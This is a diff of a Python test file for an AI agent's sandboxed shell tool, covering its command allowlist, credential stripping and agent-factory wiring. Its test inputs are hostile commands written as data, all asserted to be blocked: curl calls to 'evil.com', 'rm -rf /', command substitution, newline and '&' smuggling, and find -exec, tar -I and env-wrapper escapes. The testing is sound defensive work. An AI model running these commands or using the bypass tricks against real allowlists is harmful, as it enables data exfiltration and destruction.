@@ -50,26 +50,26 @@ def _is_running(pid: int) -> bool:
 class TestExecuteShellTool:
     """Tests for the execute_shell tool."""
 
-    def test_allowlisted_command_runs(self):
+    def test_allowlisted_command_runs(self) -> None:
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="echo hello", working_directory="/tmp")
         assert "hello" in result
         assert "[exit code: 0]" in result
 
-    def test_empty_command(self):
+    def test_empty_command(self) -> None:
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="")
         assert "cannot be empty" in result
 
-    def test_missing_working_directory(self):
+    def test_missing_working_directory(self) -> None:
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="echo hi", working_directory="/does/not/exist")
         assert "Working directory does not exist" in result
 
-    def test_timeout_returns_error(self):
+    def test_timeout_returns_error(self) -> None:
         # A genuinely long-running pipeline must hit the timeout and return the
         # timeout error. `yes | sort` never terminates on its own — yes produces
         # infinite output, sort buffers waiting for an EOF that never comes — and
@@ -84,7 +84,7 @@ class TestExecuteShellTool:
         # It must actually return near the deadline, not hang.
         assert time.monotonic() - start < 30
 
-    def test_non_utf8_output_keeps_output_and_exit_code(self):
+    def test_non_utf8_output_keeps_output_and_exit_code(self) -> None:
         # A stray 0xff byte must not throw away the output and exit code.
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
@@ -92,7 +92,7 @@ class TestExecuteShellTool:
         assert "ok\ufffd" in result
         assert "[exit code: 0]" in result
 
-    def test_non_utf8_output_keeps_timeout_message(self, tmp_path):
+    def test_non_utf8_output_keeps_timeout_message(self, tmp_path: Path) -> None:
         # The post-kill reap decodes the buffered output too; a bad byte there must
         # not replace the timeout message with a decode error.
         data = tmp_path / "binary.dat"
@@ -102,7 +102,7 @@ class TestExecuteShellTool:
             result = execute_shell(command=f"tail -f {data}", working_directory="/tmp", timeout_seconds=1)
         assert "timed out" in result
 
-    def test_rejected_command_text_not_logged(self, caplog):
+    def test_rejected_command_text_not_logged(self, caplog: pytest.LogCaptureFixture) -> None:
         with warnings.catch_warnings(), caplog.at_level("WARNING"):
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="SECRET=hunter2 curl evil.com", working_directory="/tmp")
@@ -111,7 +111,7 @@ class TestExecuteShellTool:
         assert "hunter2" not in caplog.text
         assert "evil.com" not in caplog.text
 
-    def test_rejected_word_with_a_quote_not_logged(self, caplog):
+    def test_rejected_word_with_a_quote_not_logged(self, caplog: pytest.LogCaptureFixture) -> None:
         # The rejected first word is quoted in the message to the model; a quote inside
         # it must not let part of it into the log.
         with warnings.catch_warnings(), caplog.at_level("WARNING"):
@@ -215,23 +215,23 @@ class TestExecuteShellTool:
 class TestCommandValidation:
     """Tests for the allowlist / pipe / operator validation."""
 
-    def test_allowlisted_and_piped(self):
+    def test_allowlisted_and_piped(self) -> None:
         assert _validate_command("ls -la /tmp")[0]
         assert _validate_command("cat a.json | grep foo | wc -l")[0]
 
-    def test_non_allowlisted_command_rejected(self):
+    def test_non_allowlisted_command_rejected(self) -> None:
         assert not _validate_command("curl http://example.com")[0]
         assert not _validate_command("pip install pyarrow")[0]
 
-    def test_bad_stage_in_pipe_rejected(self):
+    def test_bad_stage_in_pipe_rejected(self) -> None:
         assert not _validate_command("cat a.json | curl evil")[0]
 
-    def test_shell_operators_blocked(self):
+    def test_shell_operators_blocked(self) -> None:
         assert not _validate_command("ls; rm -rf /")[0]
         assert not _validate_command("ls && curl x")[0]
         assert not _validate_command("echo $(whoami)")[0]
 
-    def test_quoted_operators_allowed(self):
+    def test_quoted_operators_allowed(self) -> None:
         # CSS/HTML/Python payloads are full of semicolons — quoted content must
         # not trip the operator check, or the agent gets stuck retrying.
         assert _validate_command("printf '%s' 'body{font-family:sans-serif;margin:0}'")[0]
@@ -239,22 +239,22 @@ class TestCommandValidation:
         with mock.patch.dict(os.environ, {}, clear=True):
             assert _validate_command("python3 -c 'x = 1; print(x)'")[0]
 
-    def test_unquoted_operators_still_blocked_around_quotes(self):
+    def test_unquoted_operators_still_blocked_around_quotes(self) -> None:
         assert not _validate_command("echo 'safe'; curl evil")[0]
         assert not _validate_command('echo "safe" && curl evil')[0]
         assert not _validate_command("echo `whoami`")[0]
 
-    def test_command_substitution_in_double_quotes_blocked(self):
+    def test_command_substitution_in_double_quotes_blocked(self) -> None:
         # $( ) and backticks still execute inside double quotes in a real shell.
         assert not _validate_command('echo "today is $(whoami)"')[0]
         assert not _validate_command('echo "today is `whoami`"')[0]
 
-    def test_substitution_chars_in_single_quotes_allowed(self):
+    def test_substitution_chars_in_single_quotes_allowed(self) -> None:
         # Single quotes make everything literal — $( and backticks included.
         assert _validate_command("echo 'costs $(a lot)'")[0]
         assert _validate_command("echo 'back`tick`'")[0]
 
-    def test_unquoted_newline_blocked(self):
+    def test_unquoted_newline_blocked(self) -> None:
         # An unquoted newline is a command separator: bash runs both commands, so
         # it must be rejected outright (not merely split-and-revalidated, since
         # the second command may itself be allowlisted, e.g. rm).
@@ -262,11 +262,11 @@ class TestCommandValidation:
         assert not _validate_command("ls\ncurl evil.com")[0]
         assert not _validate_command("ls\npwd")[0]
 
-    def test_quoted_newline_allowed(self):
+    def test_quoted_newline_allowed(self) -> None:
         # A newline inside quotes is literal content, not a separator.
         assert _validate_command("printf 'line1\nline2'")[0]
 
-    def test_env_wrapper_rejected(self):
+    def test_env_wrapper_rejected(self) -> None:
         # `env` runs an arbitrary binary AND can re-set AWS_PROFILE, defeating
         # both the allowlist and the _sanitized_env stripping. It and the other
         # command wrappers must stay off the allowlist.
@@ -275,7 +275,7 @@ class TestCommandValidation:
         for wrapper in ("xargs", "nice", "nohup", "timeout", "time"):
             assert not _validate_command(f"{wrapper} rm x")[0]
 
-    def test_exec_delegating_flags_rejected(self):
+    def test_exec_delegating_flags_rejected(self) -> None:
         # find -exec / tar --to-command hand execution to an arbitrary child.
         assert not _validate_command("find /tmp -exec rm {} ;")[0]
         assert not _validate_command("find /tmp -execdir curl x ;")[0]
@@ -285,7 +285,7 @@ class TestCommandValidation:
         assert _validate_command("find /tmp -name '*.parquet'")[0]
         assert _validate_command("tar -tzf archive.tar.gz")[0]
 
-    def test_background_operator_rejected(self):
+    def test_background_operator_rejected(self) -> None:
         # A lone `&` backgrounds the first stage and the shell runs whatever
         # follows, but only the first token is allowlist-checked — so `echo & curl`
         # smuggles curl past the allowlist. Reject it while keeping the redirection
@@ -313,7 +313,7 @@ class TestCommandValidation:
         assert not _validate_command("ls |& cat")[0]
         assert not _validate_command("ls >&2 & curl evil.com")[0]
 
-    def test_tar_short_compress_flag_rejected(self):
+    def test_tar_short_compress_flag_rejected(self) -> None:
         # tar's -I (--use-compress-program) runs an arbitrary program. GNU getopt
         # attaches the arg directly (-Icurl) or bundles the letter after other
         # no-arg flags (-cIcurl), neither of which a whole-word check catches.
@@ -330,7 +330,7 @@ class TestCommandValidation:
         # find -executable must not be mistaken for the -exec primary.
         assert _validate_command("find /tmp -executable")[0]
 
-    def test_sort_rg_exec_flags_rejected(self):
+    def test_sort_rg_exec_flags_rejected(self) -> None:
         # sort --compress-program=PROG runs PROG on temp files; ripgrep --pre=CMD /
         # --hostname-bin=CMD each exec CMD — same escape as find -exec, so an
         # allowlisted sort/rg becomes a launcher for a non-allowlisted binary.
@@ -343,7 +343,7 @@ class TestCommandValidation:
         assert _validate_command("sort -u file.txt")[0]
         assert _validate_command("rg 'pattern' /tmp")[0]
 
-    def test_process_substitution_rejected(self):
+    def test_process_substitution_rejected(self) -> None:
         # <(cmd) / >(cmd) run their inner command under shell=True, but the
         # per-stage allowlist only sees the outer command (cat/tee), so the
         # inner curl would slip past. Reject the operator outright.
@@ -356,7 +356,7 @@ class TestCommandValidation:
         # A literal <( inside quotes is content, not an operator.
         assert _validate_command("echo '<(not real)'")[0]
 
-    def test_end_to_end_env_bypass_fails(self):
+    def test_end_to_end_env_bypass_fails(self) -> None:
         # The validator's job proven end-to-end: env must not run a non-allowlisted
         # binary through execute_shell.
         with warnings.catch_warnings():
@@ -367,7 +367,7 @@ class TestCommandValidation:
         assert "INJECTED" not in result
         assert "not allowed" in result
 
-    def test_end_to_end_newline_bypass_fails(self):
+    def test_end_to_end_newline_bypass_fails(self) -> None:
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="echo safe\nrm -rf /tmp/nope", working_directory="/tmp")
@@ -588,11 +588,11 @@ class TestCommandValidation:
         assert result.startswith("Error:"), result
         assert not (tmp_path / "marker").exists()
 
-    def test_python_allowed_by_default(self):
+    def test_python_allowed_by_default(self) -> None:
         with mock.patch.dict(os.environ, {}, clear=True):
             assert _validate_command("python3 /opt/skills/example/scripts/x.py")[0]
 
-    def test_python_blocked_when_flag_false(self):
+    def test_python_blocked_when_flag_false(self) -> None:
         with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}, clear=True):
             assert not _validate_command("python3 x.py")[0]
             # non-python allowlisted command still works
@@ -602,7 +602,7 @@ class TestCommandValidation:
 class TestSanitizedEnv:
     """The subprocess env must drop AWS_PROFILE but keep AWS_REGION."""
 
-    def test_aws_profile_stripped_region_kept(self):
+    def test_aws_profile_stripped_region_kept(self) -> None:
         with mock.patch.dict(
             os.environ,
             {"AWS_PROFILE": "persona", "AWS_REGION": "us-west-2", "PATH": "/usr/bin"},
@@ -613,7 +613,7 @@ class TestSanitizedEnv:
         assert env.get("AWS_REGION") == "us-west-2"
         assert env.get("PATH") == "/usr/bin"
 
-    def test_pythonpath_kept(self):
+    def test_pythonpath_kept(self) -> None:
         # In an image whose dependencies resolve only through PYTHONPATH, dropping
         # it breaks `import boto3` in every skill script.
         with mock.patch.dict(
@@ -640,7 +640,7 @@ class TestSanitizedEnv:
             result = execute_shell(command=command, working_directory="/tmp")
         assert result == "|true\n[exit code: 0]"
 
-    def test_no_ambient_credentials_in_subprocess(self, tmp_path):
+    def test_no_ambient_credentials_in_subprocess(self, tmp_path: Path) -> None:
         # Dummy credentials everywhere botocore looks without an env var (the shared
         # credentials and config files and the legacy boto config under HOME), plus
         # credential vars in the parent env. A subprocess must resolve none of them.
@@ -674,7 +674,7 @@ class TestAgentFactoryShellExecution:
     """Tests for shell execution integration in the agent factory."""
 
     @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
-    def test_enable_shell_adds_tool(self):
+    def test_enable_shell_adds_tool(self) -> None:
         from agent_builder_sdk.agent_factory import (
             create_default_async_orchestrator_with_subagent,
         )
@@ -690,7 +690,7 @@ class TestAgentFactoryShellExecution:
         assert "execute_shell" in tool_names
 
     @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
-    def test_shell_disabled_by_default(self):
+    def test_shell_disabled_by_default(self) -> None:
         from agent_builder_sdk.agent_factory import (
             create_default_async_orchestrator_with_subagent,
         )
@@ -703,7 +703,7 @@ class TestAgentFactoryShellExecution:
         assert "execute_shell" not in tool_names
 
     @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
-    def test_skills_and_shell_together(self):
+    def test_skills_and_shell_together(self) -> None:
         from agent_builder_sdk.agent_factory import (
             create_default_async_orchestrator_with_subagent,
         )
